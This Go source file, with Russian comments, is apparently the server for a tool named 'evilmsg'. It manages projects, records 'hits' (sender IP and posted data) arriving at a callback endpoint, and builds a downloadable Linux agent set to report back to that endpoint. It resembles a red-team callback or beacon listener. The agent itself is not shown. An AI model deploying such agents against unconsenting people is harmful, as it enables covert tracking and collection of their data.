package main

import (
	"database/sql"
	"flag"
	"fmt"
	"log"
	"os/exec"

	_ "github.com/mattn/go-sqlite3"

	"github.com/gofiber/fiber/v2"
	"github.com/gofiber/fiber/v2/middleware/cors"
)

var DB *sql.DB

type ProjectPutJSON struct {
	Name string `json:"name"`
}

type ProjectDeleteJSON struct {
	ID int `json:"id"`
}

type ProjectGetJSON struct {
	ID          int    `json:"id"`
	Name        string `json:"name"`
	Status      bool   `json:"status"`
	TimeStopped string `json:"time_stopped"`
	TimeCreated string `json:"time_started"`
}

func CreateProject(name string) error {
	_, err := DB.Exec("INSERT INTO projects (name) VALUES (?)", name)
	if err != nil {
		return err
	}

	return nil
}

func DeleteProject(id int) error {
	_, err := DB.Exec("DELETE FROM projects WHERE id = ?", id)
	if err != nil {
		return err
	}

	return nil
}

func StopProject(id int) error {
	_, err := DB.Exec("UPDATE projects SET status = 0, time_stopped = CURRENT_TIMESTAMP WHERE id = ?", id)
	if err != nil {
		return err
	}

	return nil
}

func GetProjects() ([]ProjectGetJSON, error) {
	rows, err := DB.Query("SELECT id, name, status, datetime(time_stopped), datetime(time_started) FROM projects")
	if err != nil {
		return nil, err
	}
	defer rows.Close()

	projects := []ProjectGetJSON{}
	for rows.Next() {
		project := ProjectGetJSON{}
		err = rows.Scan(&project.ID, &project.Name, &project.Status, &project.TimeStopped, &project.TimeCreated)
		if err != nil {
			return nil, err
		}

		projects = append(projects, project)
	}

	return projects, nil
}

func GetProject(id int) (ProjectGetJSON, error) {
	project := ProjectGetJSON{}
	err := DB.QueryRow("SELECT id, name, status, datetime(time_stopped), datetime(time_started) FROM projects WHERE id = ?", id).
		Scan(&project.ID, &project.Name, &project.Status, &project.TimeStopped, &project.TimeCreated)
	if err != nil {
		return project, err
	}

	return project, nil
}

func GetProjectStatus(id int) (bool, error) {
	var status bool
	err := DB.QueryRow("SELECT status FROM projects WHERE id = ?", id).Scan(&status)
	if err != nil {
		return false, err
	}

	return status, nil
}

type HitsGetJSON struct {
	ID   int    `json:"id"`
	Time string `json:"time"`
	IP   string `json:"ip"`
	Data string `json:"data"`
}

func NewHit(projectID int, ip string, data string) error {
	_, err := DB.Exec("INSERT INTO data (project_id, ip, data) VALUES (?, ?, ?)", projectID, ip, data)
	if err != nil {
		return err
	}

	return nil
}

func GetHits(projectID int) ([]HitsGetJSON, error) {
	rows, err := DB.Query("SELECT id, datetime(time), ip, data FROM data WHERE project_id = ?", projectID)
	if err != nil {
		return nil, err
	}
	defer rows.Close()

	hits := []HitsGetJSON{}
	for rows.Next() {
		hit := HitsGetJSON{}
		err = rows.Scan(&hit.ID, &hit.Time, &hit.IP, &hit.Data)
		if err != nil {
			return nil, err
		}

		hits = append(hits, hit)
	}

	return hits, nil
}

func DeleteHits(projectID int) error {
	_, err := DB.Exec("DELETE FROM data WHERE project_id = ?", projectID)
	if err != nil {
		return err
	}

	return nil
}

func initializeDB(db *sql.DB) {
	sqlStmt := `
	CREATE TABLE IF NOT EXISTS projects (
		id INTEGER PRIMARY KEY AUTOINCREMENT,
		name TEXT NOT NULL,
		status BOOLEAN DEFAULT 1,
		time_stopped TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
		time_started TIMESTAMP DEFAULT CURRENT_TIMESTAMP
	);
	`
	_, err := db.Exec(sqlStmt)
	if err != nil {
		panic(err)
	}

	sqlStmt = `
	CREATE TABLE IF NOT EXISTS data (
		id INTEGER PRIMARY KEY AUTOINCREMENT,
		project_id INTEGER NOT NULL,
		time TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
		ip TEXT NOT NULL,
		data JSON NOT NULL
	);
	`

	_, err = db.Exec(sqlStmt)
	if err != nil {
		panic(err)
	}
}

var ADDR string = "0.0.0.0"
var HIT_ADDR string = "127.0.0.1"
var PORT string = "3000"

func main() {
	// Обработка флагов командной строки
	flag.StringVar(&ADDR, "i", ADDR, "Server address")
	flag.StringVar(&PORT, "p", PORT, "Server port")
	flag.StringVar(&HIT_ADDR, "l", HIT_ADDR, "Hit address")
	flag.Parse()

	// Подключение к БД
	var err error
	DB, err = sql.Open("sqlite3", "./evilmsg_db.sqlite3")
	if err != nil {
		panic(err)
	}
	defer DB.Close()

	initializeDB(DB)

	// Веб-сервер
	app := fiber.New()

	// CORS
	app.Use(cors.New(cors.Config{
		AllowHeaders:     "Origin,Content-Type,Accept,Content-Length,Accept-Language,Accept-Encoding,Connection,Access-Control-Allow-Origin",
		AllowOrigins:     "http://127.0.0.1:3000,http://localhost:5173",
		AllowCredentials: true,
		AllowMethods:     "GET,POST,HEAD,PUT,DELETE,PATCH,OPTIONS",
	}))

	// Фронтенд
	app.Static("/", "./frontend/evilmsg/dist")

	// Получение списка проектов
	// curl 127.0.0.1:3000/api/projects
	app.Get("/api/projects", func(c *fiber.Ctx) error {
		projects, err := GetProjects()
		if err != nil {
			log.Printf("ERROR: %v", err)
			return c.SendStatus(500)
		}

		return c.JSON(projects)
	})

	// Получение проекта
	// curl 127.0.0.1:3000/api/projects/1
	app.Get("/api/projects/:id", func(c *fiber.Ctx) error {
		id, err := c.ParamsInt("id")
		if err != nil {
			log.Printf("ERROR: %v", err)
			return c.SendStatus(400)
		}

		project, err := GetProject(id)
		if err != nil {
			log.Printf("ERROR: %v", err)
			return c.SendStatus(404)
		}

		return c.JSON(project)
	})

	// Новый проект
	// curl -X PUT -H "Content-Type: application/json" --data '{"name":"test"}' 127.0.0.1:3000/api/projects
	app.Put("/api/projects", func(c *fiber.Ctx) error {
		project := new(ProjectPutJSON)

		err := c.BodyParser(project)
		if err != nil {
			log.Printf("ERROR: %v", err)
			return c.SendStatus(400)
		}

		if project.Name == "" {
			log.Println("WARNING: Name is empty")
			return c.SendStatus(400)
		}

		if err := CreateProject(project.Name); err != nil {
			log.Printf("ERROR: %v", err)
			return c.SendStatus(500)
		}

		return c.SendStatus(200)
	})

	// Удаление проекта
	// curl -X DELETE -H "Content-Type: application/json" --data '{"id":1}' 127.0.0.1:3000/api/projects
	app.Delete("/api/projects", func(c *fiber.Ctx) error {
		project := new(ProjectDeleteJSON)

		err := c.BodyParser(project)
		if err != nil {
			log.Printf("ERROR: %v", err)
			return c.SendStatus(400)
		}

		if project.ID == 0 {
			log.Println("WARNING: ID is empty")
			return c.SendStatus(400)
		}

		if err := DeleteProject(project.ID); err != nil {
			log.Printf("ERROR: %v", err)
			return c.SendStatus(500)
		}

		if err := DeleteHits(project.ID); err != nil {
			log.Printf("ERROR: %v", err)
			return c.SendStatus(500)
		}

		return c.SendStatus(200)
	})

	// Остановка проекта
	// curl -X POST -H "Content-Type: application/json" --data '{"status":false}' 127.0.0.1:3000/api/projects/1
	app.Patch("/api/projects/:id", func(c *fiber.Ctx) error {
		id, err := c.ParamsInt("id")
		if err != nil {
			log.Printf("ERROR: %v", err)
			return c.SendStatus(400)
		}

		if err := StopProject(id); err != nil {
			log.Printf("ERROR: %v", err)
			return c.SendStatus(500)
		}

		return c.SendStatus(200)
	})

	// Листенер вложений
	// curl -X POST -H "Content-Type: application/json" --data '{"status":false}' 127.0.0.1:3000/api/hit/1
	app.Post("/api/hit/:id", func(c *fiber.Ctx) error {
		id, err := c.ParamsInt("id")
		if err != nil {
			log.Printf("ERROR: %v", err)
			return c.SendStatus(400)
		}

		status, err := GetProjectStatus(id)
		if err != nil {
			log.Printf("ERROR: %v", err)
			return c.SendStatus(404)
		}

		if !status {
			log.Printf("WARNING: Project %d is stopped", id)
			return c.SendStatus(404)
		}

		ip := c.IP()
		data := c.Body()

		if err := NewHit(id, ip, string(data)); err != nil {
			log.Printf("ERROR: %v", err)
			return c.SendStatus(500)
		}

		return c.SendStatus(200)
	})

	// Получение отстуков
	// curl 127.0.0.1:3000/api/hit/1
	app.Get("/api/hit/:id", func(c *fiber.Ctx) error {
		id, err := c.ParamsInt("id")
		if err != nil {
			log.Printf("ERROR: %v", err)
			return c.SendStatus(400)
		}

		hits, err := GetHits(id)
		if err != nil {
			log.Printf("ERROR: %v", err)
			return c.SendStatus(404)
		}

		return c.JSON(hits)
	})

	// Генерация агента
	app.Get("/api/agent/linux/raw/:id", func(c *fiber.Ctx) error {
		id, err := c.ParamsInt("id")
		if err != nil {
			log.Printf("ERROR: %v", err)
			return c.SendStatus(400)
		}

		cmd := exec.Command("make", "agent_linux", fmt.Sprintf("HIT_URL=http://%s:%s/api/hit/%d", HIT_ADDR, PORT, id))
		out, err := cmd.Output()
		if err != nil {
			log.Printf("ERROR: %v", err)
			log.Println(string(out))
			return c.SendStatus(500)
		}

		log.Println(string(out))

		filename := fmt.Sprintf("agent_linux_%d.zip", id)
		c.Set("Content-Disposition", "attachment; filename="+filename)

		return c.SendFile("agents/agent_linux.zip")
	})

	app.Listen(ADDR + ":" + PORT)
}
